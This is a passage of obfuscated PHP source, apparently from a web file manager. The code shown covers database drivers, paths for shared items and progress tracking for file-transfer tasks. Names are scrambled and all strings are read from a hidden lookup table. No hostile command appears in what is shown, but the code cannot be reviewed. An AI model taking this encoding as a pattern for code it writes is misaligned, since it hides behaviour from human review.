strtolower($¥ğ‘ô°„[$¯•ƒÕ×œ[93]]) == $¯•ƒÕ×œ[38] : (isset($¥ğ‘ô°„[$¯•ƒÕ×œ[54]]) ? $¥ğ‘ô°„[$¯•ƒÕ×œ[54]] : !1), $¯•ƒÕ×œ[39] => isset($¥ğ‘ô°„[$¯•ƒÕ×œ[947]]) ? strtolower($¥ğ‘ô°„[$¯•ƒÕ×œ[947]]) == $¯•ƒÕ×œ[41] : (isset($¥ğ‘ô°„[$¯•ƒÕ×œ[93]]) ? $¥ğ‘ô°„[$¯•ƒÕ×œ[93]] : !1)); } } return $ÂŠ®˜æÖ; } public function getTables($ãÂÀò³ë = '') { $¨ö¸å“ã =& $_SERVER[¥ÙÌÜ¾ê]; if (think_config($¨ö¸å“ã[948])) { $ÇˆÊÏ©º = str_replace($¨ö¸å“ã[949], $ãÂÀò³ë, think_config($¨ö¸å“ã[948])); } else { switch ($this->dbType) { case $¨ö¸å“ã[916]: case $¨ö¸å“ã[918]: $ÇˆÊÏ©º = $¨ö¸å“ã[950]; break; case $¨ö¸å“ã[915]: case $¨ö¸å“ã[933]: $ÇˆÊÏ©º = $¨ö¸å“ã[951]; break; case $¨ö¸å“ã[942]: $ÇˆÊÏ©º = $¨ö¸å“ã[952]; break; case $¨ö¸å“ã[917]: think_exception(think_lang($¨ö¸å“ã[953]) . $¨ö¸å“ã[954]); break; case $¨ö¸å“ã[934]: $ÇˆÊÏ©º = $¨ö¸å“ã[42] . $¨ö¸å“ã[43] . $¨ö¸å“ã[44]; break; case $¨ö¸å“ã[945]: default: if (!empty($ãÂÀò³ë)) { $ÇˆÊÏ©º = $¨ö¸å“ã[898] . $ãÂÀò³ë . $¨ö¸å“ã[899]; } else { $ÇˆÊÏ©º = $¨ö¸å“ã[900]; } } } $™±ñÍ¯ş = $this->query($ÇˆÊÏ©º); $Û„ÀşÛã = array(); foreach ($™±ñÍ¯ş as $Ó¢¦Ú¤³ => $›¦õ”¨²) { $Û„ÀşÛã[$Ó¢¦Ú¤³] = current($›¦õ”¨²); } return $Û„ÀşÛã; } protected function parseLimit($™©ì½É) { $ãÛ¹×ğ¬ =& $_SERVER[¥ÙÌÜ¾ê]; $€°úıÃñ = $ãÛ¹×ğ¬[33]; if (!empty($™©ì½É)) { switch ($this->dbType) { case $ãÛ¹×ğ¬[942]: case $ãÛ¹×ğ¬[934]: $™©ì½É = explode($ãÛ¹×ğ¬[47], $™©ì½É); if (count($™©ì½É) > 1) { $€°úıÃñ .= $ãÛ¹×ğ¬[48] . $™©ì½É[1] . $ãÛ¹×ğ¬[49] . $™©ì½É[0] . $ãÛ¹×ğ¬[50]; } else { $€°úıÃñ .= $ãÛ¹×ğ¬[48] . $™©ì½É[0] . $ãÛ¹×ğ¬[50]; } break; case $ãÛ¹×ğ¬[915]: case $ãÛ¹×ğ¬[933]: break; case $ãÛ¹×ğ¬[917]: break; case $ãÛ¹×ğ¬[916]: case $ãÛ¹×ğ¬[918]: break; case $ãÛ¹×ğ¬[945]: default: $€°úıÃñ .= $ãÛ¹×ğ¬[48] . $™©ì½É . $ãÛ¹×ğ¬[50]; } } return $€°úıÃñ; } public function parseKey(&$³˜½Æ›¾, $°¾á¸¥ = true) { $Êö¸Ãµ =& $_SERVER[¥ÙÌÜ¾ê]; if ($°¾á¸¥) { $³˜½Æ›¾ = $this->parseKeyCheck($³˜½Æ›¾); } if ($this->dbType == $Êö¸Ãµ[945]) { if ($³˜½Æ›¾ != $Êö¸Ãµ[182] && !preg_match($Êö¸Ãµ[910], $³˜½Æ›¾)) { $³˜½Æ›¾ = $Êö¸Ãµ[383] . trim($³˜½Æ›¾, $Êö¸Ãµ[383]) . $Êö¸Ãµ[383]; } return $³˜½Æ›¾; } else { return parent::parseKey($³˜½Æ›¾, $°¾á¸¥); } } public function close() { $this->_linkID = null; } public function error() { $à´ÈÏáº =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->PDOStatement) { $šÛä— è = $this->PDOStatement->errorInfo(); $this->error = $šÛä— è[1] . $à´ÈÏáº[4] . $šÛä— è[2]; } else { $this->error = $à´ÈÏáº[33]; } if ($à´ÈÏáº[33] != $this->queryStr) { $this->error .= LNG($à´ÈÏáº[45]) . $this->queryStr; } think_trace($this->error, $à´ÈÏáº[33], $à´ÈÏáº[46]); return $this->error; } public function escapeString($¡ƒÈˆ‰Ÿ) { $©øäõç =& $_SERVER[¥ÙÌÜ¾ê]; switch ($this->dbType) { case $©øäõç[942]: case $©øäõç[915]: case $©øäõç[933]: case $©øäõç[945]: return addslashes($¡ƒÈˆ‰Ÿ); case $©øäõç[917]: case $©øäõç[934]: case $©øäõç[916]: case $©øäõç[918]: return str_ireplace($©øäõç[55], $©øäõç[56], $¡ƒÈˆ‰Ÿ); } } protected function parseValue($¹ŸÏóã×) { $’Ò‰ãƒ§ =& $_SERVER[¥ÙÌÜ¾ê]; if (is_string($¹ŸÏóã×)) { $ŸÊÚ¡ô = strpos($¹ŸÏóã×, $’Ò‰ãƒ§[4]) === 0 && in_array($¹ŸÏóã×, array_keys($this->bind)); $¹ŸÏóã× = $ŸÊÚ¡ô ? $this->escapeString($¹ŸÏóã×) : $’Ò‰ãƒ§[955] . $this->escapeString($¹ŸÏóã×) . $’Ò‰ãƒ§[955]; } elseif (isset($¹ŸÏóã×[0]) && is_string($¹ŸÏóã×[0]) && strtolower($¹ŸÏóã×[0]) == $’Ò‰ãƒ§[295]) { $¹ŸÏóã× = $this->escapeString($¹ŸÏóã×[1]); } elseif (is_array($¹ŸÏóã×)) { $¹ŸÏóã× = array_map(array($this, $’Ò‰ãƒ§[956]), $¹ŸÏóã×); } elseif (is_bool($¹ŸÏóã×)) { $¹ŸÏóã× = $¹ŸÏóã× ? $’Ò‰ãƒ§[87] : $’Ò‰ãƒ§[191]; } elseif (is_null($¹ŸÏóã×)) { $¹ŸÏóã× = $’Ò‰ãƒ§[103]; } return $¹ŸÏóã×; } public function getLastInsertId() { $ÑÁñ“Ğ¨ =& $_SERVER[¥ÙÌÜ¾ê]; switch ($this->dbType) { case $ÑÁñ“Ğ¨[942]: case $ÑÁñ“Ğ¨[934]: case $ÑÁñ“Ğ¨[915]: case $ÑÁñ“Ğ¨[933]: case $ÑÁñ“Ğ¨[917]: case $ÑÁñ“Ğ¨[945]: return $this->_linkID->lastInsertId(); case $ÑÁñ“Ğ¨[916]: case $ÑÁñ“Ğ¨[918]: $å›ÆÔ…İ = $this->table; $°®»ÏÚû = $this->query("\x53\x45\x4c\105\103\x54\x20{$å›ÆÔ…İ}\x2e\143\165\x72\162\x76\x61\x6c\40\x63\x75\162\162\166\141\154\40\106\122\117\x4d\40\x64\165\x61\154"); return $°®»ÏÚû ? $°®»ÏÚû[0][$ÑÁñ“Ğ¨[957]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($îİ§ä˜ş) { $¥…“Œ“ß =& $_SERVER[¥ÙÌÜ¾ê]; if (!CacheLock::fileLock($¥…“Œ“ß[9])) { return !1; } $Ò—‹ÅàÚ = parent::query($îİ§ä˜ş); CacheLock::fileUnLock($¥…“Œ“ß[9]); return $Ò—‹ÅàÚ; } public function execute($–ÁĞ´²É) { $é±Îğéı =& $_SERVER[¥ÙÌÜ¾ê]; if (!CacheLock::fileLock($é±Îğéı[9])) { return !1; } $š«á–æÓ = parent::execute($–ÁĞ´²É); CacheLock::fileUnLock($é±Îğéı[9]); return $š«á–æÓ; } } goto b¥Ç×ò‘; B»—÷÷»ƒ: class PathDriverDriverShareItem { public function __construct($ĞŒ›Ñœ³) { $this->pathParse = $ĞŒ›Ñœ³; } public function __call($†¼çœà, $ßÊÎÉ½Ô) { $€î€›ì =& $_SERVER[¥ÙÌÜ¾ê]; if (method_exists($this, $†¼çœà)) { return; } $¢ŒÎÎäè = call_user_func_array(array($€î€›ì[1263], $†¼çœà), $ßÊÎÉ½Ô); $±¼¹È× = array($€î€›ì[1264], $€î€›ì[1265], $€î€›ì[1266], $€î€›ì[1267], $€î€›ì[543], $€î€›ì[545], $€î€›ì[1268], $€î€›ì[107], $€î€›ì[1269], $€î€›ì[1270]); if (in_array($†¼çœà, $±¼¹È×)) { $¢ŒÎÎäè = $this->getPathOuter($¢ŒÎÎäè); } return $¢ŒÎÎäè; } public function copy($‚’ô¢ÃÂ, $ÆÖ¡ÔÕ, $ôŒà´Íà = false, $À”×ß = false) { return $this->copyMove($‚’ô¢ÃÂ, $ÆÖ¡ÔÕ, $ôŒà´Íà, $_SERVER[¥ÙÌÜ¾ê][543], $À”×ß); } public function move($¸øñËÂÁ, $‡æ‰ò…, $ÀºÏö‡í = false, $ŠÄç—É² = false) { return $this->copyMove($¸øñËÂÁ, $‡æ‰ò…, $ÀºÏö‡í, $_SERVER[¥ÙÌÜ¾ê][545], $ŠÄç—É²); } private function copyMove($„­ŞŞ©Ä, $¨ ¥³¡É, $àİÄ•Å­, $é±‰»Î€, $„óÀŸß€ = false) { $ÌØ¢ãõÏ =& $_SERVER[¥ÙÌÜ¾ê]; $ÚæÍ½È = $¨ ¥³¡É; $£‡öšˆú = IO::driverMake($¨ ¥³¡É); if ($£‡öšˆú->pathParse[$ÌØ¢ãõÏ[1083]]) { $¨ ¥³¡É = $£‡öšˆú->pathParse[$ÌØ¢ãõÏ[1083]]; } else { $¨ ¥³¡É = $ÚæÍ½È; } $™·Ëüî¤ = IO::copyMove($„­ŞŞ©Ä, $¨ ¥³¡É, $àİÄ•Å­, $é±‰»Î€, $„óÀŸß€); $™·Ëüî¤ = $this->getPathOuter($™·Ëüî¤); return $™·Ëüî¤; } public function pathThis($¨Ûıİú) { return get_path_this($this->pathParse[$_SERVER[¥ÙÌÜ¾ê][76]]); } public function pathFather($öÒ™€á) { return get_path_father($this->pathParse[$_SERVER[¥ÙÌÜ¾ê][76]]); } public function iconvSystem($‘ ¯¬üú) { return $‘ ¯¬üú; } protected function infoParse($¯€ïÔï, $‹ŠšŞş© = false) { $Æ±¶¡ì¥ =& $_SERVER[¥ÙÌÜ¾ê]; $—Ã™¿­Ù = $this->pathParse[$Æ±¶¡ì¥[480]][$Æ±¶¡ì¥[1106]] . $this->pathParse[$Æ±¶¡ì¥[1099]]; if ($‹ŠšŞş©) { $ƒ£şŒÅà = IO::infoWithChildren($—Ã™¿­Ù); } else { $ƒ£şŒÅà = IO::info($—Ã™¿­Ù); } $êŒôèŞ‹ = $this->pathParse[$Æ±¶¡ì¥[480]]; return Action($Æ±¶¡ì¥[1261])->_shareItemeParse($ƒ£şŒÅà, $êŒôèŞ‹); } public function listAll($°–ĞÏÅ³) { $ÃÅşÈÃ£ =& $_SERVER[¥ÙÌÜ¾ê]; $Œü™Å„Í = IO::listAll($°–ĞÏÅ³); $Ê©“Ãƒ = $this->pathParse[$ÃÅşÈÃ£[480]]; foreach ($Œü™Å„Í as &$ÌÙ³ÁëÄ) { check_abort(); $­Û„À… = IO::info($ÌÙ³ÁëÄ[$ÃÅşÈÃ£[76]]); $­Û„À… = is_array($­Û„À…) ? $­Û„À… : array(); $ÌÙ³ÁëÄ = array_merge($­Û„À…, $ÌÙ³ÁëÄ); $ÌÙ³ÁëÄ[$ÃÅşÈÃ£[85]] = Action($ÃÅşÈÃ£[1261])->_shareItemeParse($ÌÙ³ÁëÄ, $Ê©“Ãƒ); } unset($ÌÙ³ÁëÄ); return $Œü™Å„Í; } public function getPathOuter($ËÌ³Í£) { $íé”şÊ =& $_SERVER[¥ÙÌÜ¾ê]; $İŒøÑ‰ = KodIO::parse($ËÌ³Í£); if ($İŒøÑ‰[$íé”şÊ[29]] == KodIO::KOD_SHARE_ITEM) { return $İŒøÑ‰[$íé”şÊ[76]]; } $Œãùí±Ô = KodIO::clear($ËÌ³Í£); $ßˆ›‡Ÿ = KodIO::clear($this->pathParse[$íé”şÊ[480]][$íé”şÊ[1106]]); $ó¢¨šş = substr($Œãùí±Ô, strlen($ßˆ›‡Ÿ)); if (substr($Œãùí±Ô, 0, strlen($ßˆ›‡Ÿ)) != $ßˆ›‡Ÿ) { return !1; } return $this->pathParse[$íé”şÊ[1100]] . $íé”şÊ[8] . ltrim($ó¢¨šş, $íé”şÊ[8]); } public function getType() { $÷æ™ñƒ³ =& $_SERVER[¥ÙÌÜ¾ê]; $†±±¢´¼ = str_replace($÷æ™ñƒ³[72], $÷æ™ñƒ³[33], get_class($this)); return strtolower($†±±¢´¼); } public function isTypeObject($ûÀ›Ÿ²ï) { return IO::isTypeObject($ûÀ›Ÿ²ï); } public function info($İÏ÷Ô‡) { return $this->infoParse($İÏ÷Ô‡); } public function infoAuth($Î×îù­é) { return $this->infoParse($Î×îù­é); } public function infoWithChildren($ß‹¥Œ”ì) { return $this->infoParse($ß‹¥Œ”ì, !0); } public function infoFull($Ç´®ú†) { return $this->infoParse($Ç´®ú†); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ĞÇ¤Î×Á) { $this->pathParse = $ĞÇ¤Î×Á; } protected function infoParse($êõÉªÒ‚, $» ğ•Ğ = false) { $¦í‹Æé =& $_SERVER[¥ÙÌÜ¾ê]; return Action($¦í‹Æé[1105])->sharePathInfo($this->pathParse[$¦í‹Æé[76]], !0, $» ğ•Ğ); } public function listPath($ø‘µ˜ù, $àĞŒŒÁË = false) { $—¦æ·àˆ =& $_SERVER[¥ÙÌÜ¾ê]; $ê£»Áä = IO::listPath($ø‘µ˜ù, $àĞŒŒÁË); if (!$ê£»Áä) { return $ê£»Áä; } if (is_array($ê£»Áä[$—¦æ·àˆ[1262]])) { $¹¨†˜ë± = Action($—¦æ·àˆ[1271])->parsePathChildren($ê£»Áä[$—¦æ·àˆ[1262]], array($—¦æ·àˆ[416] => $ø‘µ˜ù)); $ê£»Áä[$—¦æ·àˆ[1262]] = Action($—¦æ·àˆ[1105])->shareItemInfo($¹¨†˜ë±); } foreach ($ê£»Áä as $µ¤ô×Â¦ => $ˆï–„‚Ó) { if (!in_array($µ¤ô×Â¦, array($—¦æ·àˆ[74], $—¦æ·àˆ[75]))) { continue; } foreach ($ˆï–„‚Ó as $µ€…å„ò => $¹¨†˜ë±) { $¹¨†˜ë± = Action($—¦æ·àˆ[1271])->parsePathChildren($¹¨†˜ë±, array($—¦æ·àˆ[416] => $ø‘µ˜ù)); $ê£»Áä[$µ¤ô×Â¦][$µ€…å„ò] = Action($—¦æ·àˆ[1105])->shareItemInfo($¹¨†˜ë±); } } return $ê£»Áä; } public function listAll($ôøìÊ•Ë) { $ˆ´«òù =& $_SERVER[¥ÙÌÜ¾ê]; $¹¯ìå€˜ = IO::listAll($ôøìÊ•Ë); foreach ($¹¯ìå€˜ as &$ÆÔº×­) { $æ¿°“äí = IO::info($ÆÔº×­[$ˆ´«òù[76]]); $æ¿°“äí = is_array($æ¿°“äí) ? $æ¿°“äí : array(); $ÆÔº×­ = array_merge($æ¿°“äí, $ÆÔº×­); $ÆÔº×­[$ˆ´«òù[85]] = Action($ˆ´«òù[1105])->shareItemInfo($ÆÔº×­); } unset($ÆÔº×­); return $¹¯ìå€˜; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($éœ§©Éå) { parent::__construct($éœ§©Éå); } } goto dÃŞİ¹“Û“; eè®Ú•óç: class TaskFileTransfer extends Task { protected function startAfter() { $Ğ”Òğ€ =& $_SERVER[¥ÙÌÜ¾ê]; $Òëöæ­’ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ğ”Òğ€[1608], array($this, $Ğ”Òğ€[1609])); Hook::bind($Ğ”Òğ€[1145], array($this, $Ğ”Òğ€[1610])); Hook::bind($Ğ”Òğ€[1611], array($this, $Ğ”Òğ€[1612])); Hook::bind($Ğ”Òğ€[592], array($this, $Ğ”Òğ€[1613])); Hook::bind($Ğ”Òğ€[593], array($this, $Ğ”Òğ€[1614])); Hook::bind($Ğ”Òğ€[595], array($this, $Ğ”Òğ€[1615])); Hook::bind($Ğ”Òğ€[596], array($this, $Ğ”Òğ€[1615])); Hook::bind($Ğ”Òğ€[562], array($this, $Ğ”Òğ€[1616])); Hook::bind($Ğ”Òğ€[559], array($this, $Ğ”Òğ€[1616])); Hook::bind($Ğ”Òğ€[564], array($this, $Ğ”Òğ€[1616])); Hook::bind($Ğ”Òğ€[566], array($this, $Ğ”Òğ€[1616])); Hook::bind($Ğ”Òğ€[568], array($this, $Ğ”Òğ€[1616])); Hook::bind($Ğ”Òğ€[1617], array($this, $Ğ”Òğ€[1618])); Hook::bind($Ğ”Òğ€[585], array($this, $Ğ”Òğ€[1619])); $this->sourceModelCopyFlag = !1; Hook::bind($Ğ”Òğ€[1620], array($this, $Ğ”Òğ€[1621])); Hook::bind($Ğ”Òğ€[1622], array($this, $Ğ”Òğ€[1623])); Hook::bind($Ğ”Òğ€[1624], array($this, $Ğ”Òğ€[1625])); $Òëöæ­’[$Ğ”Òğ€[1626]] = LNG($Ğ”Òğ€[1627]); $Òëöæ­’[$Ğ”Òğ€[1628]] = 0; $Òëöæ­’[$Ğ”Òğ€[1629]] = 0; $Òëöæ­’[$Ğ”Òğ€[1061]] = $Ğ”Òğ€[33]; $Òëöæ­’[$Ğ”Òğ€[1630]] = $Ğ”Òğ€[33]; $Òëöæ­’[$Ğ”Òğ€[1631]] = 0; $Òëöæ­’[$Ğ”Òğ€[1632]] = 0; $Òëöæ­’[$Ğ”Òğ€[1633]] = 0; if (!$Òëöæ­’[$Ğ”Òğ€[1481]]) { $Òëöæ­’[$Ğ”Òğ€[1481]] = LNG($Ğ”Òğ€[1634]); } } protected function endAfter() { $Ş­ÅÖ±¦ =& $_SERVER[¥ÙÌÜ¾ê]; Hook::unbind($Ş­ÅÖ±¦[1608], array($this, $Ş­ÅÖ±¦[1609])); Hook::unbind($Ş­ÅÖ±¦[1145], array($this, $Ş­ÅÖ±¦[1610])); Hook::unbind($Ş­ÅÖ±¦[1611], array($this, $Ş­ÅÖ±¦[1612])); Hook::unbind($Ş­ÅÖ±¦[592], array($this, $Ş­ÅÖ±¦[1613])); Hook::unbind($Ş­ÅÖ±¦[593], array($this, $Ş­ÅÖ±¦[1614])); Hook::unbind($Ş­ÅÖ±¦[595], array($this, $Ş­ÅÖ±¦[1615])); Hook::unbind($Ş­ÅÖ±¦[596], array($this, $Ş­ÅÖ±¦[1615])); Hook::unbind($Ş­ÅÖ±¦[562], array($this, $Ş­ÅÖ±¦[1616])); Hook::unbind($Ş­ÅÖ±¦[559], array($this, $Ş­ÅÖ±¦[1616])); Hook::unbind($Ş­ÅÖ±¦[564], array($this, $Ş­ÅÖ±¦[1616])); Hook::unbind($Ş­ÅÖ±¦[566], array($this, $Ş­ÅÖ±¦[1616])); Hook::unbind($Ş­ÅÖ±¦[568], array($this, $Ş­ÅÖ±¦[1616])); Hook::unbind($Ş­ÅÖ±¦[1617], array($this, $Ş­ÅÖ±¦[1618])); Hook::unbind($Ş­ÅÖ±¦[585], array($this, $Ş­ÅÖ±¦[1619])); Hook::unbind($Ş­ÅÖ±¦[1620], array($this, $Ş­ÅÖ±¦[1621])); Hook::unbind($Ş­ÅÖ±¦[1622], array($this, $Ş­ÅÖ±¦[1623])); Hook::unbind($Ş­ÅÖ±¦[1624], array($this, $Ş­ÅÖ±¦[1625])); } public function copyMoveStart($‹…– ¢, $öÊğÏáç, $Í”Óöâä, $‡ ïãšì) { $÷®–ëÌı =& $_SERVER[¥ÙÌÜ¾ê]; self::log($÷®–ëÌı[1635] . $öÊğÏáç . $÷®–ëÌı[67] . $‡ ïãšì); $ŸÙ”»÷× = rtrim(TEMP_FILES, $÷®–ëÌı[8]); if (substr($öÊğÏáç, 0, strlen($ŸÙ”»÷×)) == $ŸÙ”»÷×) { return; } if (substr($‡ ïãšì, 0, strlen($ŸÙ”»÷×)) == $ŸÙ”»÷×) { return; } $´¼ÍÖÌä =& $this->task; $´¼ÍÖÌä[$÷®–ëÌı[1636]] = KodIO::transferType($‹…– ¢, $Í”Óöâä); $this->update(); } public function updateAfter() { $´ß‡åŞ¦ =& $_SERVER[¥ÙÌÜ¾ê]; $«âÊ²Ï =& $this->task; if (!$«âÊ²Ï[$´ß‡åŞ¦[756]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($«âÊ²Ï[$´ß‡åŞ¦[1636]] == $´ß‡åŞ¦[1230]) { return; } self::updateTask($«âÊ²Ï); } private static function updateTask(&$«äÓè¼Ê) { $Ï¨ù¨›± =& $_SERVER[¥ÙÌÜ¾ê]; if ($«äÓè¼Ê[$Ï¨ù¨›±[1636]] == $Ï¨ù¨›±[1129] || $«äÓè¼Ê[$Ï¨ù¨›±[1636]] == $Ï¨ù¨›±[107]) { if ($«äÓè¼Ê[$Ï¨ù¨›±[1630]]) { $«äÓè¼Ê[$Ï¨ù¨›±[1633]] = $«äÓè¼Ê[$Ï¨ù¨›±[1632]] + $«äÓè¼Ê[$Ï¨ù¨›±[1629]]; } } else { if ($«äÓè¼Ê[$Ï¨ù¨›±[1636]] == $Ï¨ù¨›±[1231]) { if ($«äÓè¼Ê[$Ï¨ù¨›±[1630]] == $Ï¨ù¨›±[1129]) { $«äÓè¼Ê[$Ï¨ù¨›±[1633]] = $«äÓè¼Ê[$Ï¨ù¨›±[1632]] + $«äÓè¼Ê[$Ï¨ù¨›±[1629]] * 0.5; } else { if ($«äÓè¼Ê[$Ï¨ù¨›±[1630]] == $Ï¨ù¨›±[107]) { $«äÓè¼Ê[$Ï¨ù¨›±[1633]] = $«äÓè¼Ê[$Ï¨ù¨›±[1632]] + $«äÓè¼Ê[$Ï¨ù¨›±[1628]] * 0.5 + $«äÓè¼Ê[$Ï¨ù¨›±[1629]] * 0.5; } } } } $«äÓè¼Ê[$Ï¨ù¨›±[1583]] = $«äÓè¼Ê[$Ï¨ù¨›±[1633]] / $«äÓè¼Ê[$Ï¨ù¨›±[756]]; if ($«äÓè¼Ê[$Ï¨ù¨›±[1583]] > 0) { $µÚŠÛá´ = timeFloat() - $«äÓè¼Ê[$Ï¨ù¨›±[782]] - $«äÓè¼Ê[$Ï¨ù¨›±[1586]]; $«äÓè¼Ê[$Ï¨ù¨›±[1587]] = $µÚŠÛá´ * (1 - $«äÓè¼Ê[$Ï¨ù¨›±[1583]]) / $«äÓè¼Ê[$Ï¨ù¨›±[1583]]; } } public function addPath($à†Ëâ) { $Ü¬—·· =& $_SERVER[¥ÙÌÜ¾ê]; if (!$à†Ëâ) { return; } $à¥Üœˆ =& $this->task; $åïüèß„ = IO::infoWithChildren($à†Ëâ); $Íº¨ä°¼ = $à¥Üœˆ[$Ü¬—··[1637]] ? $à¥Üœˆ[$Ü¬—··[1637]][$Ü¬—··[1638]] : 0; $à¥Üœˆ[$Ü¬—··[1637]] = array($Ü¬—··[1638] => $Íº¨ä°¼ + 1, $Ü¬—··[415] => $åïüèß„[$Ü¬—··[28]], $Ü¬—··[76] => $åïüèß„[$Ü¬—··[76]], $Ü¬—··[513] => $åïüèß„[$Ü¬—··[513]] ? $åïüèß„[$Ü¬—··[513]] : $åïüèß„[$Ü¬—··[76]]); if ($åïüèß„[$Ü¬—··[29]] == $Ü¬—··[193]) { $à¥Üœˆ[$Ü¬—··[1059]] += 1; } else { $à¥Üœˆ[$Ü¬—··[1059]] += $åïüèß„[$Ü¬—··[81]][$Ü¬—··[79]]; if ($åïüèß„[$Ü¬—··[397]]) { $à¥Üœˆ[$Ü¬—··[1059]] += $åïüèß„[$Ü¬—··[81]][$Ü¬—··[80]] + 1; } } $à¥Üœˆ[$Ü¬—··[756]] += $åïüèß„[$Ü¬—··[78]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($ıøı©÷Å) { $¯Óñ—ş‚ =& $_SERVER[¥ÙÌÜ¾ê]; $ ƒ¢å½€ =& $this->task; $ ƒ¢å½€[$¯Óñ—ş‚[1626]] = $ıøı©÷Å[$¯Óñ—ş‚[28]]; $ ƒ¢å½€[$¯Óñ—ş‚[1061]] = $ıøı©÷Å[$¯Óñ—ş‚[28]]; $this->update(); } public function copyFileStart($¯Ôï¶², $¸ÀƒÃºÏ, $¶Ê«€Ç—, $¯ä™ æÒ, $Ğ–—××Ô, $õ—Ô›¢÷) { $€¼ÒààÓ =& $_SERVER[¥ÙÌÜ¾ê]; $§ğÆ©’  = $Ğ–—××Ô; if ($§ğÆ©’  == $GLOBALS[$€¼ÒààÓ[1639]]) { $§ğÆ©’  = $GLOBALS[$€¼ÒààÓ[1640]]; } $GLOBALS[$€¼ÒààÓ[1640]] = $Ğ–—××Ô; $GLOBALS[$€¼ÒààÓ[1639]] = $õ—Ô›¢÷; $ßßš¥±— =& $this->task; $ßßš¥±—[$€¼ÒààÓ[1626]] = $§ğÆ©’ ; $ßßš¥±—[$€¼ÒààÓ[1628]] = (int) $¯Ôï¶²->size($¸ÀƒÃºÏ); $ßßš¥±—[$€¼ÒààÓ[1629]] = 0; $ßßš¥±—[$€¼ÒààÓ[1061]] = $€¼ÒààÓ[33]; $ßßš¥±—[$€¼ÒààÓ[1630]] = $€¼ÒààÓ[33]; $ßßš¥±—[$€¼ÒààÓ[1631]] = 0; $æáãÓ¬Œ = $ßßš¥±—[$€¼ÒààÓ[1628]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ßßš¥±—[$€¼ÒààÓ[395]] . $€¼ÒààÓ[1641]); if ($æáãÓ¬Œ && file_exists(get_path_father($¯ä™ æÒ))) { Cache::set($ßßš¥±—[$€¼ÒààÓ[395]] . $€¼ÒààÓ[1641], $¯ä™ æÒ); $ßßš¥±—[$€¼ÒààÓ[1601]] = array($€¼ÒààÓ[1642], $€¼ÒààÓ[1643]); } $this->update(0, $æáãÓ¬Œ); } public static function updateCopyLocalFileSize($¤¤¤âƒš) { $­ïøÓ±˜ =& $_SERVER[¥ÙÌÜ¾ê]; $ÏíäÉ = Cache::get($¤¤¤âƒš[$­ïøÓ±˜[395]] . $­ïøÓ±˜[1641]); if (!$ÏíäÉ || !file_exists($ÏíäÉ)) { return $¤¤¤âƒš; } $¤¤¤âƒš[$­ïøÓ±˜[1629]] = @filesize($ÏíäÉ); $¤¤¤âƒš[$­ïøÓ±˜[1633]] += $¤¤¤âƒš[$­ïøÓ±˜[1629]]; self::updateTask($¤¤¤âƒš); return $¤¤¤âƒš; } public function copyFileEnd($ ÓòòêÅ, $ŒÛ–äí•, $§³û¹¨—, $§¡Ù“·¦, $ç¤‘‘Ê³, $Æ÷úÒŒ) { $ü¿’çş¯ =& $_SERVER[¥ÙÌÜ¾ê]; $®§ñéÓŸ =& $this->task; $®§ñéÓŸ[$ü¿’çş¯[1629]] = $®§ñéÓŸ[$ü¿’çş¯[1628]]; $®§ñéÓŸ[$ü¿’çş¯[1630]] = $ü¿’çş¯[33]; unset($®§ñéÓŸ[$ü¿’çş¯[1601]]); if ($ç¤‘‘Ê³ == $®§ñéÓŸ[$ü¿’çş¯[1626]]) { $®§ñéÓŸ[$ü¿’çş¯[1632]] += $®§ñéÓŸ[$ü¿’çş¯[1628]]; $®§ñéÓŸ[$ü¿’çş¯[1633]] = $®§ñéÓŸ[$ü¿’çş¯[1632]]; $this->update(1); } else { $this->update(); $®§ñéÓŸ[$ü¿’çş¯[1629]] = 0; } Cache::remove($®§ñéÓŸ[$ü¿’çş¯[395]] . $ü¿’çş¯[1641]); self::log($ü¿’çş¯[1644] . $ŒÛ–äí• . $ü¿’çş¯[67] . $§¡Ù“·¦ . $ü¿’çş¯[229] . $ç¤‘‘Ê³ . $ü¿’çş¯[1645] . $®§ñéÓŸ[$ü¿’çş¯[1626]]); } public function updateFileEnd($”©à°Ï, $¦Ò½óØÄ) { $„Ê²¢œ„ =& $_SERVER[¥ÙÌÜ¾ê]; $Å¸´üû² =& $this->task; $Å¸´üû²[$„Ê²¢œ„[1626]] = $”©à°Ï; $Å¸´üû²[$„Ê²¢œ„[1628]] = $¦Ò½óØÄ; $Å¸´üû²[$„Ê²¢œ„[1632]] += $¦Ò½óØÄ; $Å¸´üû²[$„Ê²¢œ„[1633]] = $Å¸´üû²[$„Ê²¢œ„[1632]]; $this->update(1); self::log($„Ê²¢œ„[1646] . $”©à°Ï); } public function sourceModelCopy($»Áã·»À) { $ÒÂÖ¯¬â =& $_SERVER[¥ÙÌÜ¾ê]; $êºÉŠñ = $»Áã·»À[0]; $ŒÁÅÌç¢ = $»Áã·»À[1]; $¤†Çõøô =& $this->task; $this->sourceModelCopyFlag = !0; $ŸÛ®è«Æ = 0; switch ($êºÉŠñ) { case $ÒÂÖ¯¬â[560]: $ŸÛ®è«Æ = 1; break; case $ÒÂÖ¯¬â[563]: $¤†Çõøô[$ÒÂÖ¯¬â[1626]] = $ŒÁÅÌç¢[$ÒÂÖ¯¬â[28]]; break; case $ÒÂÖ¯¬â[565]: $ŸÛ®è«Æ = intval($»Áã·»À[$ÒÂÖ¯¬â[378]] * 0.4); break; case $ÒÂÖ¯¬â[567]: $ŸÛ®è«Æ = intval($»Áã·»À[$ÒÂÖ¯¬â[378]] * 0.2); break; case $ÒÂÖ¯¬â[569]: $ŸÛ®è«Æ = intval($»Áã·»À[$ÒÂÖ¯¬â[378]] * 0.4); break; } $this->update($ŸÛ®è«Æ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¤ß›—ä™, $…ª‰ÙÊõ) { $Å¦Œ±˜Ş =& $_SERVER[¥ÙÌÜ¾ê]; $this->sourceModelCopyFlag = !0; $çÜÉÌÜÔ = 1; if (isset($¤ß›—ä™[$Å¦Œ±˜Ş[81]])) { $çÜÉÌÜÔ = $¤ß›—ä™[$Å¦Œ±˜Ş[81]][$Å¦Œ±˜Ş[79]] + $¤ß›—ä™[$Å¦Œ±˜Ş[81]][$Å¦Œ±˜Ş[80]] + 1; } 